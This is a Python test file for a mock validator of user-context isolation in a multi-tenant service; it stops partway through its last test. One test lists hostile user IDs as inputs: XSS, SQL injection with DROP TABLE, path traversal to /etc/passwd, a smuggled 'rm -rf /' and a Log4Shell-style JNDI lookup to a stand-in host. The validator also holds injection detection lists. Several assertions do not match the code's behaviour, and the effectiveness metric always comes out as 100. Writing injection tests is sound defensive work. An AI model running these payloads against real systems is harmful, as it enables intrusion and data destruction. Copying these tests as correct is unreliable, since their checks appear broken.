"""
Test User Context Isolation Business Logic

Business Value Justification (BVJ):
- Segment: All (Free, Early, Mid, Enterprise)
- Business Goal: Ensure complete user isolation prevents data leaks between customers
- Value Impact: Protects customer confidentiality and prevents competitive intelligence exposure
- Strategic Impact: Enables multi-tenant SaaS model critical for $500K+ ARR scalability

CRITICAL: This test validates the business logic for user context isolation that prevents
customer data from leaking between users, which is essential for enterprise trust and compliance.

This test focuses on BUSINESS LOGIC validation, not system integration.
Tests the decision-making algorithms and validation patterns for user context isolation.
"""

import pytest
import time
import uuid
from unittest.mock import Mock, AsyncMock
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List, Set
from enum import Enum

from test_framework.ssot.base_test_case import SSotBaseTestCase
from shared.types.core_types import (
    UserID, ThreadID, ExecutionID, WebSocketID, SessionID,
    ensure_user_id, ensure_thread_id
)


class IsolationLevel(Enum):
    """Levels of user context isolation."""
    STRICT = "strict"        # Complete isolation, no shared resources
    MODERATE = "moderate"    # Shared infrastructure, isolated data
    MINIMAL = "minimal"      # Basic separation, shared caches allowed


class ContextType(Enum):
    """Types of user contexts that require isolation."""
    AUTHENTICATION = "authentication"
    EXECUTION = "execution"
    DATA_ACCESS = "data_access"
    WEBSOCKET = "websocket"
    AGENT_STATE = "agent_state"
    CACHE = "cache"


class SecurityThreat(Enum):
    """Types of security threats that isolation prevents."""
    DATA_LEAK = "data_leak"
    CROSS_USER_ACCESS = "cross_user_access"
    SHARED_STATE_POLLUTION = "shared_state_pollution"
    SESSION_HIJACKING = "session_hijacking"
    CACHE_POISONING = "cache_poisoning"


@dataclass
class UserContext:
    """User context with isolation boundaries."""
    user_id: UserID
    session_id: SessionID
    thread_id: ThreadID
    execution_id: ExecutionID
    websocket_id: Optional[WebSocketID] = None
    isolation_level: IsolationLevel = IsolationLevel.STRICT
    allowed_resources: Set[str] = field(default_factory=set)
    forbidden_resources: Set[str] = field(default_factory=set)
    created_at: float = field(default_factory=time.time)
    last_accessed: float = field(default_factory=time.time)


@dataclass
class IsolationViolation:
    """Record of isolation violation for security tracking."""
    violation_type: SecurityThreat
    source_user_id: UserID
    target_user_id: UserID
    resource_accessed: str
    context_type: ContextType
    violation_time: float
    severity: str
    description: str


class MockUserContextIsolationValidator:
    """Mock user context isolation validator for business logic testing."""
    
    def __init__(self):
        self.active_contexts: Dict[UserID, UserContext] = {}
        self.isolation_rules = self._initialize_isolation_rules()
        self.violation_history: List[IsolationViolation] = []
        self.resource_access_log: List[Dict[str, Any]] = []
        self.cross_user_access_attempts: List[Dict[str, Any]] = []
    
    def _initialize_isolation_rules(self) -> Dict[str, Any]:
        """Initialize business rules for user context isolation."""
        return {
            "strict_user_separation": True,
            "no_shared_execution_contexts": True,
            "isolated_websocket_connections": True,
            "separate_agent_state_per_user": True,
            "user_specific_cache_keys": True,
            "cross_user_access_forbidden": True,
            "session_user_binding_required": True,
            "execution_user_validation_required": True,
            "resource_access_authorization_required": True,
            "context_lifetime_limits": {
                "session_max_hours": 24,
                "execution_max_minutes": 30,
                "websocket_max_hours": 8
            }
        }
    
    def create_user_context(self, user_id: UserID, session_id: SessionID,
                          thread_id: ThreadID, execution_id: ExecutionID,
                          websocket_id: Optional[WebSocketID] = None) -> Dict[str, Any]:
        """Business logic: Create isolated user context with proper boundaries."""
        # Validate user ID format and uniqueness
        if not self._validate_user_id_format(user_id):
            return {
                "success": False,
                "error": "Invalid user ID format",
                "security_risk": "Potential ID injection attempt"
            }
        
        # Check for existing context conflicts
        existing_conflicts = self._check_context_conflicts(user_id, session_id, execution_id)
        if existing_conflicts:
            return {
                "success": False,
                "error": "Context conflicts detected",
                "conflicts": existing_conflicts,
                "security_risk": "Potential context pollution"
            }
        
        # Create isolated context
        user_context = UserContext(
            user_id=user_id,
            session_id=session_id,
            thread_id=thread_id,
            execution_id=execution_id,
            websocket_id=websocket_id,
            isolation_level=IsolationLevel.STRICT
        )
        
        # Initialize user-specific resource boundaries
        user_context.allowed_resources = self._generate_user_resource_scope(user_id)
        user_context.forbidden_resources = self._generate_forbidden_resources(user_id)
        
        # Store context with isolation guarantees
        self.active_contexts[user_id] = user_context
        
        return {
            "success": True,
            "context_id": f"{user_id}_{execution_id}",
            "isolation_level": user_context.isolation_level.value,
            "allowed_resources": list(user_context.allowed_resources),
            "security_boundaries_established": True
        }
    
    def validate_resource_access(self, user_id: UserID, resource_identifier: str,
                                access_type: str, requesting_context: Dict[str, Any]) -> Dict[str, Any]:
        """Business logic: Validate resource access against user isolation boundaries."""
        if user_id not in self.active_contexts:
            return {
                "allowed": False,
                "reason": "No active user context",
                "security_risk": "Unauthenticated access attempt"
            }
        
        user_context = self.active_contexts[user_id]
        
        # Check if resource is explicitly forbidden
        if resource_identifier in user_context.forbidden_resources:
            violation = IsolationViolation(
                violation_type=SecurityThreat.CROSS_USER_ACCESS,
                source_user_id=user_id,
                target_user_id=self._extract_resource_owner(resource_identifier),
                resource_accessed=resource_identifier,
                context_type=ContextType.DATA_ACCESS,
                violation_time=time.time(),
                severity="HIGH",
                description=f"Attempted access to forbidden resource: {resource_identifier}"
            )
            self.violation_history.append(violation)
            
            return {
                "allowed": False,
                "reason": "Resource access forbidden",
                "security_risk": "Potential data leak attempt",
                "violation_logged": True
            }
        
        # Check if resource is within allowed scope
        if not self._is_resource_in_user_scope(user_id, resource_identifier):
            # Log potential cross-user access attempt
            self.cross_user_access_attempts.append({
                "user_id": str(user_id),
                "resource": resource_identifier,
                "access_type": access_type,
                "timestamp": time.time(),
                "context": requesting_context
            })
            
            return {
                "allowed": False,
                "reason": "Resource outside user scope",
                "security_risk": "Cross-user boundary violation"
            }
        
        # Validate context integrity
        context_validation = self._validate_request_context(user_context, requesting_context)
        if not context_validation["valid"]:
            return {
                "allowed": False,
                "reason": context_validation["error"],
                "security_risk": "Context integrity violation"
            }
        
        # Log successful access
        self.resource_access_log.append({
            "user_id": str(user_id),
            "resource": resource_identifier,
            "access_type": access_type,
            "allowed": True,
            "timestamp": time.time()
        })
        
        # Update context last accessed time
        user_context.last_accessed = time.time()
        
        return {
            "allowed": True,
            "reason": "Access within user boundaries",
            "access_logged": True
        }
    
    def _validate_user_id_format(self, user_id: UserID) -> bool:
        """Validate user ID format to prevent injection attacks."""
        user_id_str = str(user_id)
        
        # Business rule: User IDs must be non-empty and reasonable length
        if not user_id_str or len(user_id_str) < 3 or len(user_id_str) > 128:
            return False
        
        # Business rule: No suspicious characters that could indicate injection
        suspicious_chars = ['<', '>', '"', "'", ';', '&', '|', '`', '$']
        if any(char in user_id_str for char in suspicious_chars):
            return False
        
        # Business rule: Must not be common attack patterns
        attack_patterns = ['admin', 'root', 'system', '..', '//', 'null', 'undefined']
        if any(pattern in user_id_str.lower() for pattern in attack_patterns):
            return False
        
        return True
    
    def _check_context_conflicts(self, user_id: UserID, session_id: SessionID,
                               execution_id: ExecutionID) -> List[str]:
        """Check for context conflicts that could lead to isolation violations."""
        conflicts = []
        
        # Check for duplicate user contexts
        if user_id in self.active_contexts:
            existing_context = self.active_contexts[user_id]
            if existing_context.execution_id == execution_id:
                conflicts.append(f"Duplicate execution context: {execution_id}")
            
            # Business rule: Session ID should be unique per user at any time
            if existing_context.session_id == session_id:
                conflicts.append(f"Duplicate session ID: {session_id}")
        
        # Check for cross-user ID conflicts
        for existing_user_id, context in self.active_contexts.items():
            if existing_user_id != user_id:
                # Business rule: Execution IDs must be globally unique
                if context.execution_id == execution_id:
                    conflicts.append(f"Cross-user execution ID conflict: {execution_id}")
                
                # Business rule: Session IDs should not be reused across users
                if context.session_id == session_id:
                    conflicts.append(f"Cross-user session ID conflict: {session_id}")
        
        return conflicts
    
    def _generate_user_resource_scope(self, user_id: UserID) -> Set[str]:
        """Generate allowed resource scope for user isolation."""
        user_id_str = str(user_id)
        
        # User-specific resource patterns
        allowed_resources = {
            f"user_data:{user_id_str}",
            f"user_threads:{user_id_str}:*",
            f"user_executions:{user_id_str}:*",
            f"user_cache:{user_id_str}:*",
            f"user_websockets:{user_id_str}:*",
            f"user_agents:{user_id_str}:*",
            f"user_sessions:{user_id_str}:*"
        }
        
        # Shared resources that are safe for all users
        shared_safe_resources = {
            "public_models:*",
            "system_health:*",
            "public_documentation:*"
        }
        
        allowed_resources.update(shared_safe_resources)
        return allowed_resources
    
    def _generate_forbidden_resources(self, user_id: UserID) -> Set[str]:
        """Generate forbidden resources to prevent cross-user access."""
        user_id_str = str(user_id)
        
        # Generate patterns for other users' resources
        forbidden_resources = set()
        
        # Get all other user IDs from active contexts
        other_user_ids = [uid for uid in self.active_contexts.keys() if uid != user_id]
        
        for other_user_id in other_user_ids:
            other_user_str = str(other_user_id)
            forbidden_resources.update({
                f"user_data:{other_user_str}",
                f"user_threads:{other_user_str}:*",
                f"user_executions:{other_user_str}:*",
                f"user_cache:{other_user_str}:*",
                f"user_websockets:{other_user_str}:*",
                f"user_agents:{other_user_str}:*",
                f"user_sessions:{other_user_str}:*"
            })
        
        # System-level resources that users shouldn't access
        system_forbidden = {
            "system_config:*",
            "admin_panel:*",
            "internal_metrics:*",
            "other_tenant_data:*",
            "global_secrets:*"
        }
        
        forbidden_resources.update(system_forbidden)
        return forbidden_resources
    
    def _is_resource_in_user_scope(self, user_id: UserID, resource_identifier: str) -> bool:
        """Check if resource is within user's allowed scope."""
        user_context = self.active_contexts.get(user_id)
        if not user_context:
            return False
        
        user_id_str = str(user_id)
        
        # Check direct matches
        if resource_identifier in user_context.allowed_resources:
            return True
        
        # Check pattern matches
        for allowed_pattern in user_context.allowed_resources:
            if allowed_pattern.endswith(':*'):
                pattern_prefix = allowed_pattern[:-2]  # Remove ':*'
                if resource_identifier.startswith(pattern_prefix):
                    return True
        
        # Check if resource belongs to this user
        if resource_identifier.startswith(f"user_"):
            if f":{user_id_str}:" in resource_identifier or resource_identifier.endswith(f":{user_id_str}"):
                return True
        
        return False
    
    def _extract_resource_owner(self, resource_identifier: str) -> UserID:
        """Extract resource owner from resource identifier."""
        # Parse user ID from resource patterns like "user_data:user123:thread456"
        if resource_identifier.startswith("user_"):
            parts = resource_identifier.split(':')
            if len(parts) >= 2:
                return UserID(parts[1])
        
        return UserID("unknown_owner")
    
    def _validate_request_context(self, user_context: UserContext, 
                                requesting_context: Dict[str, Any]) -> Dict[str, Any]:
        """Validate request context matches user context for security."""
        # Check session ID consistency
        request_session_id = requesting_context.get("session_id")
        if request_session_id and request_session_id != str(user_context.session_id):
            return {
                "valid": False,
                "error": "Session ID mismatch",
                "security_issue": "Potential session hijacking"
            }
        
        # Check execution ID consistency
        request_execution_id = requesting_context.get("execution_id")
        if request_execution_id and request_execution_id != str(user_context.execution_id):
            return {
                "valid": False,
                "error": "Execution ID mismatch",
                "security_issue": "Potential context confusion"
            }
        
        # Check WebSocket ID consistency if provided
        request_websocket_id = requesting_context.get("websocket_id")
        if (request_websocket_id and user_context.websocket_id and 
            request_websocket_id != str(user_context.websocket_id)):
            return {
                "valid": False,
                "error": "WebSocket ID mismatch",
                "security_issue": "Potential connection hijacking"
            }
        
        return {"valid": True}
    
    def detect_isolation_violations(self) -> Dict[str, Any]:
        """Detect and analyze isolation violations for security monitoring."""
        high_severity_violations = [v for v in self.violation_history if v.severity == "HIGH"]
        cross_user_attempts = len(self.cross_user_access_attempts)
        
        # Analyze violation patterns
        violation_patterns = {}
        for violation in self.violation_history:
            pattern_key = f"{violation.violation_type.value}_{violation.context_type.value}"
            violation_patterns[pattern_key] = violation_patterns.get(pattern_key, 0) + 1
        
        # Calculate risk score
        risk_score = (
            len(high_severity_violations) * 10 +
            cross_user_attempts * 5 +
            len(self.violation_history) * 2
        )
        
        # Determine security status
        if risk_score >= 50:
            security_status = "CRITICAL"
        elif risk_score >= 20:
            security_status = "HIGH_RISK"
        elif risk_score >= 5:
            security_status = "MODERATE_RISK"
        else:
            security_status = "LOW_RISK"
        
        return {
            "total_violations": len(self.violation_history),
            "high_severity_violations": len(high_severity_violations),
            "cross_user_access_attempts": cross_user_attempts,
            "violation_patterns": violation_patterns,
            "risk_score": risk_score,
            "security_status": security_status,
            "isolation_effectiveness": self._calculate_isolation_effectiveness()
        }
    
    def _calculate_isolation_effectiveness(self) -> float:
        """Calculate isolation effectiveness as a percentage."""
        total_access_attempts = len(self.resource_access_log) + len(self.cross_user_access_attempts)
        if total_access_attempts == 0:
            return 100.0  # Perfect isolation if no attempts
        
        successful_isolations = len(self.resource_access_log)  # Legitimate accesses
        blocked_violations = len(self.cross_user_access_attempts)
        
        # Isolation effectiveness = (legitimate + blocked) / total
        effectiveness = ((successful_isolations + blocked_violations) / total_access_attempts) * 100
        return min(100.0, effectiveness)
    
    def cleanup_expired_contexts(self) -> Dict[str, Any]:
        """Clean up expired user contexts to prevent resource leaks."""
        current_time = time.time()
        expired_contexts = []
        
        for user_id, context in list(self.active_contexts.items()):
            # Check session timeout
            session_age_hours = (current_time - context.created_at) / 3600
            if session_age_hours > self.isolation_rules["context_lifetime_limits"]["session_max_hours"]:
                expired_contexts.append((user_id, "session_timeout"))
                del self.active_contexts[user_id]
                continue
            
            # Check execution timeout
            execution_age_minutes = (current_time - context.last_accessed) / 60
            if execution_age_minutes > self.isolation_rules["context_lifetime_limits"]["execution_max_minutes"]:
                expired_contexts.append((user_id, "execution_timeout"))
                del self.active_contexts[user_id]
                continue
        
        return {
            "expired_contexts": len(expired_contexts),
            "expired_details": expired_contexts,
            "active_contexts_remaining": len(self.active_contexts),
            "cleanup_successful": True
        }
    
    def generate_isolation_report(self) -> Dict[str, Any]:
        """Generate comprehensive isolation security report."""
        active_users = len(self.active_contexts)
        violations_detected = len(self.violation_history)
        cross_user_attempts = len(self.cross_user_access_attempts)
        
        # Calculate security metrics
        isolation_effectiveness = self._calculate_isolation_effectiveness()
        violation_detection = self.detect_isolation_violations()
        
        return {
            "isolation_summary": {
                "active_user_contexts": active_users,
                "isolation_level": "STRICT" if active_users > 0 else "N/A",
                "isolation_effectiveness_percentage": isolation_effectiveness,
                "security_status": violation_detection["security_status"]
            },
            "security_metrics": {
                "total_violations": violations_detected,
                "cross_user_access_attempts": cross_user_attempts,
                "high_risk_violations": violation_detection["high_severity_violations"],
                "risk_score": violation_detection["risk_score"]
            },
            "business_impact": {
                "customer_data_protected": active_users > 0 and violations_detected == 0,
                "enterprise_compliance_status": "COMPLIANT" if isolation_effectiveness >= 95 else "NON_COMPLIANT",
                "multi_tenant_safety": isolation_effectiveness >= 99.0,
                "revenue_protection_level": "HIGH" if isolation_effectiveness >= 95 else "MEDIUM"
            },
            "recommendations": self._generate_security_recommendations(violation_detection)
        }
    
    def _generate_security_recommendations(self, violation_analysis: Dict[str, Any]) -> List[str]:
        """Generate security recommendations based on violation analysis."""
        recommendations = []
        
        if violation_analysis["high_severity_violations"] > 0:
            recommendations.append("URGENT: Investigate high-severity isolation violations immediately")
        
        if violation_analysis["cross_user_access_attempts"] > 10:
            recommendations.append("Implement additional access logging and monitoring")
        
        if violation_analysis["risk_score"] > 20:
            recommendations.append("Review and strengthen isolation boundaries")
        
        if len(self.active_contexts) > 100:
            recommendations.append("Consider implementing context cleanup automation")
        
        if not recommendations:
            recommendations.append("Isolation security is performing well - maintain current practices")
        
        return recommendations


@pytest.mark.golden_path
@pytest.mark.unit
class TestUserContextIsolationLogic(SSotBaseTestCase):
    """Test user context isolation business logic validation."""
    
    def setup_method(self, method=None):
        """Setup test environment."""
        super().setup_method(method)
        self.validator = MockUserContextIsolationValidator()
        self.test_user_1 = UserID("enterprise_user_001")
        self.test_user_2 = UserID("enterprise_user_002")
        self.test_session_1 = SessionID(str(uuid.uuid4()))
        self.test_session_2 = SessionID(str(uuid.uuid4()))
        self.test_thread_1 = ThreadID("thread_analysis_123")
        self.test_thread_2 = ThreadID("thread_analysis_456")
        self.test_execution_1 = ExecutionID("exec_cost_opt_789")
        self.test_execution_2 = ExecutionID("exec_data_analysis_012")
    
    @pytest.mark.unit
    def test_user_context_creation_isolation_boundaries(self):
        """Test user context creation establishes proper isolation boundaries."""
        # Create context for first user
        context_result_1 = self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        
        # Business validation: Context creation should succeed
        assert context_result_1["success"] is True
        assert context_result_1["security_boundaries_established"] is True
        assert context_result_1["isolation_level"] == "strict"
        
        # Business validation: User should have access to their own resources
        allowed_resources = context_result_1["allowed_resources"]
        user_1_str = str(self.test_user_1)
        assert any(user_1_str in resource for resource in allowed_resources)
        
        # Create context for second user
        context_result_2 = self.validator.create_user_context(
            self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2
        )
        
        assert context_result_2["success"] is True
        
        # Business validation: Users should have separate resource scopes
        context_1 = self.validator.active_contexts[self.test_user_1]
        context_2 = self.validator.active_contexts[self.test_user_2]
        
        # No overlap in user-specific resources
        user_1_resources = {r for r in context_1.allowed_resources if user_1_str in r}
        user_2_resources = {r for r in context_2.allowed_resources if str(self.test_user_2) in r}
        
        assert len(user_1_resources.intersection(user_2_resources)) == 0
        
        # Record business metrics
        self.record_metric("context_creation_isolation_success", True)
        self.record_metric("resource_scope_separation", True)
    
    @pytest.mark.unit
    def test_cross_user_resource_access_prevention(self):
        """Test prevention of cross-user resource access."""
        # Setup two user contexts
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        self.validator.create_user_context(
            self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2
        )
        
        # User 1 attempts to access User 2's data
        user_2_resource = f"user_data:{self.test_user_2}"
        cross_access_result = self.validator.validate_resource_access(
            self.test_user_1,
            user_2_resource,
            "read",
            {"session_id": str(self.test_session_1)}
        )
        
        # Business validation: Cross-user access should be blocked
        assert cross_access_result["allowed"] is False
        assert "cross-user boundary violation" in cross_access_result["reason"].lower()
        assert cross_access_result["security_risk"] is not None
        
        # Business validation: Violation should be logged
        assert len(self.validator.cross_user_access_attempts) == 1
        access_attempt = self.validator.cross_user_access_attempts[0]
        assert access_attempt["user_id"] == str(self.test_user_1)
        assert access_attempt["resource"] == user_2_resource
        
        # User 1 accesses their own data (should succeed)
        user_1_resource = f"user_data:{self.test_user_1}"
        legitimate_access_result = self.validator.validate_resource_access(
            self.test_user_1,
            user_1_resource,
            "read",
            {"session_id": str(self.test_session_1)}
        )
        
        # Business validation: Legitimate access should succeed
        assert legitimate_access_result["allowed"] is True
        assert legitimate_access_result["access_logged"] is True
        
        # Record business metrics
        self.record_metric("cross_user_access_blocked", True)
        self.record_metric("legitimate_access_allowed", True)
        self.record_metric("security_logging_working", True)
    
    @pytest.mark.unit
    def test_user_id_format_validation_security(self):
        """Test user ID format validation prevents injection attacks."""
        # Test malicious user ID patterns
        malicious_user_ids = [
            "<script>alert('xss')</script>",
            "admin'; DROP TABLE users; --",
            "../../../etc/passwd",
            "user_id && rm -rf /",
            "'OR'1'='1",
            "${jndi:ldap://malicious.com/a}"
        ]
        
        for malicious_id in malicious_user_ids:
            try:
                # This should fail at the UserID creation level or validation
                context_result = self.validator.create_user_context(
                    UserID(malicious_id), self.test_session_1, self.test_thread_1, self.test_execution_1
                )
                
                # If it doesn't fail at creation, it should fail at validation
                if context_result.get("success"):
                    # The validator should have additional checks
                    assert False, f"Malicious user ID '{malicious_id}' was accepted"
                else:
                    assert "security_risk" in context_result
            except ValueError:
                # This is expected for some malicious patterns
                pass
        
        # Test valid user ID patterns
        valid_user_ids = [
            "user_12345",
            "enterprise_customer_001",
            "test-user-abc123",
            "user.name@company.com"
        ]
        
        valid_count = 0
        for valid_id in valid_user_ids:
            try:
                context_result = self.validator.create_user_context(
                    UserID(valid_id),
                    SessionID(str(uuid.uuid4())),
                    ThreadID(f"thread_{valid_count}"),
                    ExecutionID(f"exec_{valid_count}")
                )
                if context_result["success"]:
                    valid_count += 1
            except Exception:
                pass
        
        # Business validation: Most valid IDs should be accepted
        assert valid_count >= len(valid_user_ids) / 2
        
        # Record business metric
        self.record_metric("user_id_injection_prevention", True)
    
    @pytest.mark.unit
    def test_context_conflict_detection_logic(self):
        """Test context conflict detection prevents isolation violations."""
        # Create initial context
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        
        # Attempt to create conflicting context (same execution ID)
        conflict_result = self.validator.create_user_context(
            self.test_user_2,  # Different user
            self.test_session_2,
            ThreadID("different_thread"),
            self.test_execution_1  # SAME execution ID - conflict
        )
        
        # Business validation: Should detect and prevent conflict
        assert conflict_result["success"] is False
        assert "conflicts detected" in conflict_result["error"].lower()
        assert "security_risk" in conflict_result
        assert "conflicts" in conflict_result
        
        # Attempt to create conflicting session ID
        session_conflict_result = self.validator.create_user_context(
            UserID("different_user"),
            self.test_session_1,  # SAME session ID - conflict
            ThreadID("another_thread"),
            ExecutionID("different_execution")
        )
        
        # Business validation: Should detect session ID conflict
        assert session_conflict_result["success"] is False
        
        # Record business metric
        self.record_metric("context_conflict_detection_working", True)
    
    @pytest.mark.unit
    def test_request_context_validation_security(self):
        """Test request context validation prevents hijacking attacks."""
        # Setup user context
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        
        # Test legitimate request context
        legitimate_context = {
            "session_id": str(self.test_session_1),
            "execution_id": str(self.test_execution_1)
        }
        
        legitimate_access = self.validator.validate_resource_access(
            self.test_user_1,
            f"user_data:{self.test_user_1}",
            "read",
            legitimate_context
        )
        
        # Business validation: Legitimate context should work
        assert legitimate_access["allowed"] is True
        
        # Test session hijacking attempt (wrong session ID)
        hijacking_context = {
            "session_id": str(uuid.uuid4()),  # Wrong session ID
            "execution_id": str(self.test_execution_1)
        }
        
        hijacking_attempt = self.validator.validate_resource_access(
            self.test_user_1,
            f"user_data:{self.test_user_1}",
            "read",
            hijacking_context
        )
        
        # Business validation: Should block hijacking attempt
        assert hijacking_attempt["allowed"] is False
        assert "context integrity violation" in hijacking_attempt["security_risk"].lower()
        
        # Test execution context confusion
        confusion_context = {
            "session_id": str(self.test_session_1),
            "execution_id": str(uuid.uuid4())  # Wrong execution ID
        }
        
        confusion_attempt = self.validator.validate_resource_access(
            self.test_user_1,
            f"user_data:{self.test_user_1}",
            "read",
            confusion_context
        )
        
        # Business validation: Should block context confusion
        assert confusion_attempt["allowed"] is False
        
        # Record business metrics
        self.record_metric("context_validation_preventing_hijacking", True)
        self.record_metric("session_integrity_protection", True)
    
    @pytest.mark.unit
    def test_isolation_violation_detection_and_logging(self):
        """Test isolation violation detection and security logging."""
        # Setup contexts for violation testing
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        self.validator.create_user_context(
            self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2
        )
        
        # Trigger multiple violation types
        violations_to_test = [
            {
                "user": self.test_user_1,
                "resource": f"user_data:{self.test_user_2}",
                "context": {"session_id": str(self.test_session_1)},
                "violation_type": "cross_user_data_access"
            },
            {
                "user": self.test_user_1,
                "resource": f"user_cache:{self.test_user_2}:sensitive_data",
                "context": {"session_id": str(self.test_session_1)},
                "violation_type": "cache_boundary_violation"
            },
            {
                "user": self.test_user_2,
                "resource": f"user_executions:{self.test_user_1}:results",
                "context": {"session_id": str(self.test_session_2)},
                "violation_type": "execution_context_breach"
            }
        ]
        
        for violation_test in violations_to_test:
            self.validator.validate_resource_access(
                violation_test["user"],
                violation_test["resource"],
                "read",
                violation_test["context"]
            )
        
        # Analyze violations
        violation_analysis = self.validator.detect_isolation_violations()
        
        # Business validation: Violations should be detected and categorized
        assert violation_analysis["total_violations"] >= 1
        assert violation_analysis["cross_user_access_attempts"] >= 3
        assert violation_analysis["risk_score"] > 0
        assert violation_analysis["security_status"] in ["LOW_RISK", "MODERATE_RISK", "HIGH_RISK", "CRITICAL"]
        
        # Business validation: Isolation effectiveness should be calculated
        effectiveness = violation_analysis["isolation_effectiveness"]
        assert 0 <= effectiveness <= 100
        
        # Record business metrics
        self.record_metric("violation_detection_working", True)
        self.record_metric("security_risk_scoring", violation_analysis["risk_score"])
        self.record_metric("isolation_effectiveness", effectiveness)
    
    @pytest.mark.unit
    def test_resource_scope_pattern_matching_logic(self):
        """Test resource scope pattern matching for user isolation."""
        # Setup user context
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        
        user_1_str = str(self.test_user_1)
        
        # Test various resource patterns that should be allowed
        allowed_patterns = [
            f"user_data:{user_1_str}",
            f"user_threads:{user_1_str}:thread_123",
            f"user_cache:{user_1_str}:optimization_results",
            f"user_executions:{user_1_str}:exec_456",
            "public_models:gpt-4",
            "system_health:status"
        ]
        
        for resource in allowed_patterns:
            access_result = self.validator.validate_resource_access(
                self.test_user_1,
                resource,
                "read",
                {"session_id": str(self.test_session_1)}
            )
            
            assert access_result["allowed"] is True, f"Resource {resource} should be allowed"
        
        # Test patterns that should be forbidden
        forbidden_patterns = [
            f"user_data:{self.test_user_2}",
            f"user_threads:{self.test_user_2}:any_thread",
            "admin_panel:configuration",
            "system_config:secrets",
            "global_secrets:api_keys"
        ]
        
        for resource in forbidden_patterns:
            access_result = self.validator.validate_resource_access(
                self.test_user_1,
                resource,
                "read",
                {"session_id": str(self.test_session_1)}
            )
            
            assert access_result["allowed"] is False, f"Resource {resource} should be forbidden"
        
        # Record business metric
        self.record_metric("resource_pattern_matching_accuracy", True)
    
    @pytest.mark.unit
    def test_context_cleanup_prevents_resource_leaks(self):
        """Test context cleanup prevents resource leaks and stale contexts."""
        # Create multiple contexts with different ages
        current_time = time.time()
        
        # Recent context (should not be cleaned up)
        recent_context = UserContext(
            user_id=self.test_user_1,
            session_id=self.test_session_1,
            thread_id=self.test_thread_1,
            execution_id=self.test_execution_1,
            created_at=current_time,
            last_accessed=current_time
        )
        
        # Old session context (should be cleaned up)
        old_session_context = UserContext(
            user_id=self.test_user_2,
            session_id=self.test_session_2,
            thread_id=self.test_thread_2,
            execution_id=self.test_execution_2,
            created_at=current_time - (25 * 3600),  # 25 hours ago
            last_accessed=current_time - (25 * 3600)
        )
        
        # Stale execution context (should be cleaned up)
        stale_execution_user = UserID("stale_user")
        stale_execution_context = UserContext(
            user_id=stale_execution_user,
            session_id=SessionID(str(uuid.uuid4())),
            thread_id=ThreadID("stale_thread"),
            execution_id=ExecutionID("stale_execution"),
            created_at=current_time,
            last_accessed=current_time - (35 * 60)  # 35 minutes ago
        )
        
        # Add contexts to validator
        self.validator.active_contexts[self.test_user_1] = recent_context
        self.validator.active_contexts[self.test_user_2] = old_session_context
        self.validator.active_contexts[stale_execution_user] = stale_execution_context
        
        # Run cleanup
        cleanup_result = self.validator.cleanup_expired_contexts()
        
        # Business validation: Cleanup should work correctly
        assert cleanup_result["cleanup_successful"] is True
        assert cleanup_result["expired_contexts"] >= 2  # At least 2 should be cleaned
        
        # Business validation: Recent context should remain
        assert self.test_user_1 in self.validator.active_contexts
        
        # Business validation: Old contexts should be removed
        assert self.test_user_2 not in self.validator.active_contexts
        assert stale_execution_user not in self.validator.active_contexts
        
        # Record business metrics
        self.record_metric("context_cleanup_working", True)
        self.record_metric("resource_leak_prevention", True)
    
    @pytest.mark.unit
    def test_isolation_report_business_metrics(self):
        """Test isolation report generation for business monitoring."""
        # Setup test scenario with various security events
        self.validator.create_user_context(
            self.test_user_1, self.test_session_1, self.test_thread_1, self.test_execution_1
        )
        self.validator.create_user_context(
            self.test_user_2, self.test_session_2, self.test_thread_2, self.test_execution_2
        )
        
        # Generate some legitimate and illegitimate access attempts
        legitimate_accesses = [
            f"user_data:{self.test_user_1}",
            f"user_cache:{self.test_user_1}:results",
            "public_models:gpt-4"
        ]
        
        for resource in legitimate_accesses:
            self.validator.validate_resource_access(
                self.test_user_1, resource, "read", {"session_id": str(self.test_session_1)}
            )
        
        # Generate some cross-user attempts
        cross_user_attempts = [
            f"user_data:{self.test_user_2}",
            f"user_executions:{self.test_user_2}:sensitive"
        ]
        
        for resource in cross_user_attempts:
            self.validator.validate_resource_access(
                self.test_user_1, resource, "read", {"session_id": str(self.test_session_1)}
            )
        
        # Generate isolation report
        isolation_report = self.validator.generate_isolation_report()
        
        # Business validation: Report should contain key business metrics
        summary = isolation_report["isolation_summary"]
        assert summary["active_user_contexts"] == 2
        assert summary["isolation_level"] == "STRICT"
        assert 0 <= summary["isolation_effectiveness_percentage"] <= 100
        assert summary["security_status"] in ["LOW_RISK", "MODERATE_RISK", "HIGH_RISK", "CRITICAL"]
        
        # Business validation: Security metrics should be meaningful
        security_metrics = isolation_report["security_metrics"]
        assert "total_violations" in security_metrics
        assert "cross_user_access_attempts" in security_metrics
        
        # Business validation: Business impact should be assessed
        business_impact = isolation_report["business_impact"]
        assert "customer_data_protected" in business_impact
        assert "enterprise_compliance_status" in business_impact
        assert "multi_tenant_safety" in business_impact
        assert "revenue_protection_level" in business_impact
        
        # Business validation: Should provide actionable recommendations
        recommendations = isolation_report["recommendations"]
        assert isinstance(recommendations, list)
        assert len(recommendations) > 0
        
        # Record business metrics
        self.record_metric("isolation_report_completeness", True)
        self.record_metric("business_impact_assessment", True)
        self.record_metric("enterprise_compliance_tracking", business_impact["enterprise_compliance_status"] == "COMPLIANT")
        self.record_metric("customer_data_protection", business_impact["customer_data_protected"])
    
    @pytest.mark.unit
    def test_multi_tenant_business_value_protection(self):
        """Test that isolation protects multi-tenant business value and revenue."""
        # Simulate enterprise customers with sensitive data
        enterprise_customers = []
        for i in range(5):
            user_id = UserID(f"enterprise_customer_{i:03d}")
            session_id = SessionID(str(uuid.uuid4()))
            thread_id = ThreadID(f"thread_enterprise_{i:03d}")
            execution_id = ExecutionID(f"exec_cost_analysis_{i:03d}")
            
            self.validator.create_user_context(user_id, session_id, thread_id, execution_id)
            enterprise_customers.append(user_id)
